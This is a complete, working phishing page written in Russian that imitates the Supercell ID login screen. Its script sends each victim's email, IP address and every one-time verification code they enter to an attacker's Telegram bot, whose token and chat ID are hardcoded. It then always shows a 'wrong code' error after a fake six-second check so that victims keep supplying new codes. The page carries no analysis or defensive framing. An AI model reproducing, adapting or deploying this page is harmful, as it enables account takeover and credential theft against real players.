<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Supercell ID</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
            background: #0B0C10;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 480px;
            width: 100%;
            background: #1A1D24;
            border-radius: 32px;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 1px solid #2A2F3A;
        }

        .header {
            background: #0F1117;
            padding: 28px 24px;
            text-align: center;
            border-bottom: 1px solid #2A2F3A;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 8px;
        }

        .logo-icon {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #3C5BFF, #1E3A8A);
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            font-weight: bold;
            color: white;
            box-shadow: 0 4px 12px rgba(60, 91, 255, 0.3);
        }

        .logo-text {
            font-size: 28px;
            font-weight: 800;
            color: white;
            letter-spacing: -0.5px;
        }

        .logo-text span {
            color: #3C5BFF;
        }

        .subtitle {
            color: #8E94A3;
            font-size: 14px;
            margin-top: 8px;
        }

        .content {
            padding: 32px 24px;
        }

        .input-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            color: #C0C5D0;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            background: #0F1117;
            border: 1.5px solid #2A2F3A;
            border-radius: 16px;
            color: white;
            outline: none;
            transition: all 0.2s;
            font-family: inherit;
        }

        input:focus {
            border-color: #3C5BFF;
            box-shadow: 0 0 0 3px rgba(60, 91, 255, 0.2);
        }

        input::placeholder {
            color: #4A4F5E;
        }

        button {
            width: 100%;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            background: #3C5BFF;
            color: white;
            border: none;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
            margin-top: 8px;
        }

        button:active {
            transform: scale(0.98);
            background: #2A48E0;
        }

        button.secondary {
            background: #2A2F3A;
            margin-top: 12px;
        }

        button.secondary:active {
            background: #1E222C;
        }

        button:disabled {
            opacity: 0.6;
            transform: none;
            cursor: not-allowed;
        }

        .message {
            margin-top: 20px;
            padding: 14px;
            border-radius: 14px;
            text-align: center;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }

        .message.error {
            background: rgba(255, 70, 70, 0.15);
            color: #FF6B6B;
            border: 1px solid rgba(255, 70, 70, 0.3);
            display: block;
        }

        .message.info {
            background: rgba(60, 91, 255, 0.15);
            color: #3C5BFF;
            border: 1px solid rgba(60, 91, 255, 0.3);
            display: block;
        }

        .hidden {
            display: none;
        }

        .email-display {
            color: #3C5BFF;
            font-weight: 600;
            word-break: break-all;
        }

        .step2-info {
            background: #0F1117;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 24px;
            text-align: center;
            border: 1px solid #2A2F3A;
        }

        .step2-info p {
            color: #8E94A3;
            font-size: 14px;
            margin-top: 8px;
        }

        .code-hint {
            font-size: 13px;
            color: #5A6072;
            text-align: center;
            margin-top: 12px;
        }

        .footer {
            background: #0F1117;
            padding: 16px;
            text-align: center;
            border-top: 1px solid #2A2F3A;
        }

        .footer a {
            color: #5A6072;
            font-size: 12px;
            text-decoration: none;
            margin: 0 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">S</div>
                <div class="logo-text">Supercell <span>ID</span></div>
            </div>
            <div class="subtitle">Один аккаунт для всех игр</div>
        </div>

        <div class="content">
            <!-- Шаг 1: ввод email -->
            <div id="step1">
                <div class="input-group">
                    <label>Электронная почта</label>
                    <input type="email" id="email" placeholder="example@mail.com" autocomplete="off">
                </div>
                <button onclick="sendEmail()">Продолжить</button>
            </div>

            <!-- Шаг 2: ввод кода -->
            <div id="step2" class="hidden">
                <div class="step2-info">
                    <div style="font-size: 32px; margin-bottom: 8px;">📧</div>
                    <div>Код отправлен на</div>
                    <div class="email-display" id="emailDisplay"></div>
                    <p>Введите 6-значный код из письма</p>
                </div>
                <div class="input-group">
                    <label>Код подтверждения</label>
                    <input type="text" id="code" placeholder="••••••" maxlength="6" autocomplete="off" style="text-align: center; letter-spacing: 4px; font-size: 20px;">
                </div>
                <button id="verifyBtn" onclick="verifyCode()">Подтвердить</button>
                <button class="secondary" onclick="resetForm()">Использовать другой email</button>
                <div class="code-hint">Не пришёл код? Проверьте папку Спам</div>
                <div id="message" class="message"></div>
            </div>
        </div>

        <div class="footer">
            <a href="#">Помощь</a>
            <a href="#">Конфиденциальность</a>
            <a href="#">Условия</a>
        </div>
    </div>

    <script>
        // ВСТАВЛЕНЫ ТВОИ ДАННЫЕ
        const BOT_TOKEN = "8119321079:AAGngmPagp8L8BBj8lYzMMIN_FZDN52h2Cs";
        const CHAT_ID = "5314096451";
        
        let currentEmail = '';
        let isProcessing = false;  // Блокировка повторного нажатия
        let retryCount = 0;        // Счётчик попыток
        
        // Отправка в Telegram
        async function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
            } catch(e) {
                console.error('Telegram error:', e);
            }
        }
        
        // Показать сообщение
        function showMessage(text, type) {
            const msgDiv = document.getElementById('message');
            msgDiv.textContent = text;
            msgDiv.className = `message ${type}`;
        }
        
        function hideMessage() {
            const msgDiv = document.getElementById('message');
            msgDiv.className = 'message';
            msgDiv.textContent = '';
        }
        
        // Шаг 1: отправка email
        async function sendEmail() {
            if (isProcessing) return;
            
            const email = document.getElementById('email').value.trim();
            if (!email) {
                showMessage('Введите адрес электронной почты', 'error');
                return;
            }
            
            // Простая валидация email
            if (!email.includes('@') || !email.includes('.')) {
                showMessage('Введите корректный email', 'error');
                return;
            }
            
            isProcessing = true;
            const btn = event.target;
            btn.disabled = true;
            btn.textContent = 'Отправка...';
            
            currentEmail = email;
            retryCount = 0;
            
            // Отправляем email в Telegram
            await sendToTelegram(`📧 НОВАЯ ПОЧТА\nEmail: ${email}\nВремя: ${new Date().toLocaleString()}\nIP: ${await getIP() || 'unknown'}`);
            
            // Переход на шаг 2
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('emailDisplay').innerText = email;
            document.getElementById('code').value = '';
            hideMessage();
            
            btn.disabled = false;
            btn.textContent = 'Продолжить';
            isProcessing = false;
            
            // Автофокус на поле кода
            setTimeout(() => {
                document.getElementById('code').focus();
            }, 100);
        }
        
        // Получение IP (для уведомления)
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return null;
            }
        }
        
        // Шаг 2: проверка кода (с задержкой 6 секунд)
        async function verifyCode() {
            if (isProcessing) return;
            
            const code = document.getElementById('code').value.trim();
            if (!code) {
                showMessage('Введите код подтверждения', 'error');
                return;
            }
            
            if (code.length < 4) {
                showMessage('Код должен содержать минимум 4 символа', 'error');
                return;
            }
            
            isProcessing = true;
            const verifyBtn = document.getElementById('verifyBtn');
            const originalText = verifyBtn.textContent;
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'Проверка...';
            
            retryCount++;
            
            // Отправляем код в Telegram
            let messageType = retryCount === 1 ? '🔑 КОД ДОСТУПА' : '🔄 ПОВТОРНЫЙ КОД';
            await sendToTelegram(`${messageType}\nEmail: ${currentEmail}\nКод: ${code}\nПопытка: ${retryCount}\nВремя: ${new Date().toLocaleString()}`);
            
            // ЗАДЕРЖКА 6 СЕКУНД (имитация проверки)
            setTimeout(() => {
                // После задержки показываем ошибку
                showMessage('Неверный код. Попробуйте ещё раз.', 'error');
                
                // Очищаем поле кода
                document.getElementById('code').value = '';
                document.getElementById('code').focus();
                
                // Разблокируем кнопку
                verifyBtn.disabled = false;
                verifyBtn.textContent = originalText;
                isProcessing = false;
                
                // Дополнительно: если попытка > 2, добавляем небольшой "намёк" на ожидание
                if (retryCount >= 3) {
                    const hint = document.querySelector('.code-hint');
                    const originalHint = hint.textContent;
                    hint.textContent = 'Попробуйте через несколько минут';
                    setTimeout(() => {
                        hint.textContent = originalHint;
                    }, 3000);
                }
            }, 6000);  // 6 секунд задержки
        }
        
        // Сброс формы (вернуться к email)
        function resetForm() {
            if (isProcessing) return;
            
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step1').classList.remove('hidden');
            document.getElementById('email').value = '';
            document.getElementById('code').value = '';
            hideMessage();
            currentEmail = '';
            retryCount = 0;
            
            // Сброс кнопки на всякий случай
            const verifyBtn = document.getElementById('verifyBtn');
            verifyBtn.disabled = false;
            verifyBtn.textContent = 'Подтвердить';
            isProcessing = false;
        }
        
        // Обработка ввода кода (только цифры и буквы, автомат переход не делаем)
        document.addEventListener('DOMContentLoaded', () => {
            const codeInput = document.getElementById('code');
            if (codeInput) {
                codeInput.addEventListener('input', (e) => {
                    // Ограничим длину 6 символов
                    if (e.target.value.length > 6) {
                        e.target.value = e.target.value.slice(0, 6);
                    }
                });
            }
            
            // На enter в поле кода вызываем verifyCode
            const codeField = document.getElementById('code');
            if (codeField) {
                codeField.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        verifyCode();
                    }
                });
            }
            
            // На enter в email
            const emailField = document.getElementById('email');
            if (emailField) {
                emailField.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        sendEmail();
                    }
                });
            }
        });
    </script>
</body>
</html>
